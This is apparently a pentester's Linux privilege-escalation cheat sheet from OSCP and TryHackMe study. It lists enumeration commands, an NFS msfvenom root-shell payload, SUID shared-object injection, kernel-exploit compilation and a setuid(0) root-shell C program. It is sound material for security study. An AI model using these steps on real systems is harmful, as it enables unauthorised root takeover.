# Linux Privilege Escalation

## Linux Privilege Escalation

**OS & User Enumeration :**

```
############################### User Enumeration ################################

whoami
id
sudo -l
cat /etc/passwd
ls -la /etc/shadow

################################# OS Enumeration #################################

cat /etc/issue
cat /etc/*-release
cat /proc/version
uname -a
arch
ldd --verion

################################# Installed tools ################################

which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null

############################ File owners and permissions #########################

ls -la
find . -ls
history
cat ~/.bash_history
find / -type f -user <username> -readable 2> /dev/null # Readable files for user
find / -writable -type d 2>/dev/null # Writable files by the user
find /usr/local/ -type d -writable

################################## File mount ####################################

/mnt /media -> usb devices and other mounted disks
mount -> show all the mounted drives
df -h -> list all partitions
cat /etc/fstab # list all drives mounted at boot time
/bin/lsblk

#################################### Applications ################################

dpkg -l # for Debian based systems

##################################### Cron tabs ##################################

ls -lah /etc/cron*
cat /etc/crontab
ls -la /var/log/cron*           # Locating cron logs
find / -name cronlog 2>/dev/null
grep "CRON" /var/log/cron.log   # for locating running jobs from logs
grep CRON /var/log/syslog       # grepping cron from syslog


#################################### Internal Ports ##############################

Netstat -alnp | grep LIST | grep port_num
Netstat -antp
netstat -tulnp
curl the listening ports

################################### Interesting DIRS #############################
 /
 /dev 
 /scripts 
 /opt 
 /mnt 
 /var/www/html 
 /var 
 /etc 
 /media
 /backup

################################### SUID Binaries ################################

(https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -user root 2>/dev/null
ldd /usr/bin/binary-name
strace /usr/local/bin/fishybinary 2>&1 | grep -iE "open|access|no such file"

################################# Firewall Enumeration ###########################

grep -Hs iptables /etc/*

############################### Kernal Modules ##################################

lsmod
/sbin/modinfo <mod name>

```

**PrivEsc Checklist :**

* sudo rights ([https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d](https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d))
* sensitive files & permission misconfiguration (SSH keys, shadow files)
* SUID Binaries
* Internal Ports
* Processes running with root privilege
* Cron tabs
  * Hidden cron process with pspy
* Mounted filesystems
* TMUX session hijacking
* Path Hijacking
* Process Injection ([https://github.com/nongiach/sudo\_inject](https://github.com/nongiach/sudo\_inject))
* Docker PS
* Interesting groups ([https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe))
  * Wheel
  * Shadow
  * Disk
  * Video
  * Root
  * Docker
  * lxd - ([https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/))
* Environment variables
* bash version < 4.2-048 | 4.4 ([https://tryhackme.com/room/linuxprivesc](https://tryhackme.com/room/linuxprivesc) Task 14, 15)
* NFS Misconfiguration
* linpeas.sh -a //all checks

**SUID Shared Object Injection :**

* Find a SUID binary that looks fishy
* `strace /usr/local/bin/fishybinary 2>&1 | grep -iE "open|access|no such file"`
* Match the shared object that sits in a path where you have write access
* create a shared object in the missing SO file name
* run the SUID binary

**NFS Misconfiguration :**

\*\*\*\*[**https://tryhackme.com/room/linuxprivesc**](https://tryhackme.com/room/linuxprivesc) **(Task 19)**

* `cat /etc/exports`
* **On Kali**
  * `mkdir /tmp/nfs`
  * `mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs`
  * `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
  * `chmod +xs /tmp/nfs/shell.elf`
* **On Target**
  * `/tmp/shell.elf`

### **Kernel Exploits**

* `cat /proc/version`
* `uname -r`
* `uname -mrs`
* `cat /etc/lsb-release`
* `cat /etc/os-release`
* `gcc exploit.c -o exp`
* Compile exploit in local machine and upload to remote machine
  * `gcc -m32 -Wl,--hash-style=both 9542.c -o 9542`
  * `apt-get install gcc-multilib`

**Recover Deleted Files :**

* extundelete (HTB mirai - [https://tiagotavares.io/2017/11/mirai-hack-the-box-retired/](https://tiagotavares.io/2017/11/mirai-hack-the-box-retired/))
* strings

**C Program to SetUID /bin/bash :**

`gcc -Wall suid.c -o exploit`

`sudo chown root exploit`

`sudo chmod u+s exploit`

`$ ls -l exploit -rwsr-xr-x 1 root users 6894 11 sept. 22:05 exploit`

```
#include <unistd.h>

int main()
{
    setuid(0);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}
```

\`./exploit

## whoami

root\`

**Tools :**

* [ ] Linux Exploit Suggester (HTB Nibbles) ([https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester))
* [ ] SUIDENUM ([https://github.com/Anon-Exploiter/SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM))
* [ ] LinEnum.sh ([https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum))
* [ ] linpeas.sh ([https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS))
* [ ] Linprivchecker ([https://github.com/sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker))
* [ ] pspy ([https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)) (crontabs)

**Resources :**

* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_-\_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_-\_linux.html)
* [https://github.com/Ignitetechnologies/Privilege-Escalation](https://github.com/Ignitetechnologies/Privilege-Escalation)
* [https://gtfobins.github.io/](https://gtfobins.github.io)
* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
